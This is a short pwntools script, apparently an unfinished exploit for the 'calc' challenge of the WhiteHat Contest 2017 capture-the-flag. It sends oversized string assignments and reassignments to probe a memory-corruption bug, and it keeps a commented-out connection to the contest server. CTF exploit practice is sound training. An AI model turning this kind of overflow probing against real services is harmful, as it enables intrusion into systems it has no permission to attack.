from pwn import *


p = process("./calc", env={'LD_PRELOAD':'./libc.so.6'})
#p = process("./calc", env={'LD_PRELOAD':'/home/jhsong/WhiteHatContest2017/calc/libc.so.6'})
#p = process("./calc", env={'LD_PRELOAD':'./libc.so.6'})
#p = remote("challenges.whitehatcontest.kr", 24756)
#p = process("./calc", env={'LD_PRELOAD':'./libc-2.23.so'})


print p.recvuntil(">>>")
p.sendline('a="'+'a'*250+'"')
#p.sendline('a="'+'0'*264+'EAAA'+'"')
print p.recvuntil(">>>")
p.sendline('a=65')
print p.recvuntil(">>>")
p.sendline('b="'+'c'*65+'"')
print p.recvuntil(">>>")
raw_input()
p.sendline('b=a')
print p.recvuntil(">>>")


p.close()
